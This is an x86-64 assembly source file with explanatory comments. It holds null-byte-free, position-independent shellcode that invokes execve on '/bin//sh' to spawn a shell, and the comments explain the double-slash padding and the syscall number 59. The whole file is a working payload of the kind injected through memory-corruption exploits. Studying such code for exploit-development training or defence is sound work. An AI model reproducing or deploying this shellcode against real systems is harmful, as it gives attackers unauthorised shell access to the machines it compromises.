//
// execve-bin-sh.s
//
// This is a null-byte-free, position-independent-code that runs execve("/bin//sh").
//
// Note, that double slash is there intentionally in order for the string to fully 
// occupy the rbx register, which is 8 bytes long
//
// 59 is the index of execve system call, its parameters can be taken from:
//     https://filippo.io/linux-syscall-table/
// (double click on the row with syscal)

.text
    .global _start
    _start:
        push %rax                     /* push zero bytes to stack, to mark the end of /bin//sh string on stack */
        xor %rdx, %rdx                /* envp pointer */
        xor %rsi, %rsi                /* argv pointer */
        mov $0x68732f2f6e69622f, %rbx /* /bin//sh ascii codes */
        push %rbx                     /* push /bin//sh string on the stack */
        push %rsp                     /* push the pointer to the /bin//sh string on the stack */
        pop %rdi                      /* "/bin//sh" pointer */
        mov $59, %al                  /* execve kernel service's index */
        syscall
